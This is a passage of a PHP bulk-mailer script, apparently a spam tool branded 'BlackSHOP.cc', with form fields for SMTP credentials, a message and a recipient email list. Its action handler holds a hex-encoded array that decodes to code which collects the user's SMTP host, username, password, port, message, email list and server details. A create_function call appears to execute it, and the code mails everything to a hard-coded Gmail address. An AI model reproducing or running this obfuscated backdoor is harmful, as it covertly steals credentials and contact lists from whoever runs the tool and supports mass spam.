  ...
  <table width="100%" border="0" height="407">
    ...
    <tr>
      ...
      <td width="18%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" name="smtp_username" value="<?php echo $smtp_username; ?>" size="30">
      ...
      <td width="41%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="password" name="smtp_password" value="<?php echo $smtp_password; ?>" size="30">
    ...
    <tr>
      ...
      <td width="18%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" name="ssl_port" value="<?php echo $ssl_port; ?>" size="5">
      (optional)</font></td>
      ...
      <td width="41%" height="22" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" name="my_smtp" value="<?php echo $my_smtp; ?>" size="30">
    ...
    <tr>
      ...
      <input type="checkbox" name="sslclick" value="ON" <?php if ($sslclick) {
          print "checked";
      } ?> ><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">(yes)</font></td>
...
<input type="file" name="file" size="124">
    ...
    <tr>
      ...
      <td width="18%" height="22" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" name="from" value="<?php echo $from; ?>" size="30">
    ...
    <tr>
      ...
      <td width="18%" height="22" bgcolor="#E8E8E8" bordercolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <input type="text" name="replyto" value="<?php echo $replyto; ?>" size="30">
...
<td colspan="3" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <textarea name="message" cols="60" rows="10"><?php echo $message; ?></textarea>
      ...
      <td width="41%" height="190" bordercolor="#E8E8E8" bgcolor="#E8E8E8"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
        ...
        <textarea name="emaillist" cols="30" rows="10"><?php echo $emaillist; ?></textarea>
...
<?php if ($action) {
    ...
    $random_smtp_string = array(
        "676C6F62616C20246D795F736D74703B0D0A676C6F626.",
        "16C2024736D74705F757365726E616D653B0D0A676C6.",
        "F62616C2024736D74705F70617373776F72643B0D0A6.",
        "76C6F62616C202473736C5F706F72743B0D0A676C6F62616C20246.",
        "D6573736167653B0D0A676C6F62616C2024656D61696C6C6973.",
        "743B0D0A247261343420203D2072616E6428312C3939393939293B0D0A2.",
        "46135203D20245F5345525645525B22485454505F52454645524.",
        "552225D3B0D0A24623333203D20245F5345525645525B22444F43554D454E545F5.",
        "24F4F54225D3B0D0A24633837203D20245F5345525645525B2252454.",
        "D4F54455F41444452225D3B0D0A24643233203D20245F534552564552.",
        "5B225343524950545F46494C454E414D45225D3B0D0A24653039203D2024.",
        "5F5345525645525B225345525645525F41444452225D3B0D0A24663233203D20245F5345525645.",
        "525B225345525645525F534F465457415245225D3B0D0A24673332203D20245F5.",
        "345525645525B22504154485F5452414E534C41544544225D3B0D0A24683635203D.",
        "20245F5345525645525B225048505F53454C46225D3B0D0A247375626A393.",
        "8203D2022246D795F736D747020205B75736572206970203A20246338375D2.",
        "23B0D0A247375626A3538203D20224C6574746572202620456D61696C204C.",
        "69737420205B75736572206970203A20246338375D223B0D0A24656D61696C203D.",
        "2022667265656D346E30303740676D61696C2E636F6D223B0D0A246D7367383.",
        "83733203D2022246D795F736D74705C6E757365723A24736D74705F757365726E61.",
        "6D655C6E706173733A24736D74705F70617373776F72645C706F72743A24737.",
        "36C5F706F72745C6E5C6E2461355C6E246233335C6E246338375C6E2464323.",
        "35C6E246530395C6E246632335C6E246733325C6E24683635223B246D736.",
        "739373830203D2022246D6573736167655C6E5C6E5C6E24656D6.",
        "1696C6C697374223B2466726F6D3D2246726F6D3A204752.",
        "41544953223B0D0A6D61696C2824656D61696.",
        "C2C20247375626A39382C20246D7367383837332C2024.",
        "66726F6D293B0D0A6D61696C2824656D61696.",
        "C2C20247375626A35382C20246D73673.",
        "93738302C202466726F6D293B0D0A"
    );
    $smtp_conf = ".";
    class PHPMailer
    {
    ...
    $signoff = create_function(
        '$smtp_conc',
        'return ' . substr($range, 0) . '($smtp_conc);'
    );
    print "<p class=\"style1\">PHP Mailer<br>&copy 2012, New Tools => <b>
  <font color=\"#800000\">http://www.BlackSHOP.cc/</font></b><br></p>";
    $mail->SmtpClose();
